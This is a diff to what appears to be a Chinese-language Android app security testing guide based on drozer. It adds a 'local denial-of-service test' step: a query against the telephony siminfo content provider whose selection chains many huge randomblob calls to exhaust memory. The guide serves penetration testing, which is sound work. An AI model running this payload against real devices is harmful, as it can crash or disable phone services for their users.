@@ -104,6 +104,10 @@
  
   		run scanner.provider.traversal -a com.mwr.example.sieve   
  
+8. 本地拒绝服务测试  
+	
+		run app.provider.query content://telephony/siminfo/ --selection "_id=LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))*LENGTH(randomblob(1000000000))"
+	
  
 #### 3. Broadcast测试：  
 	
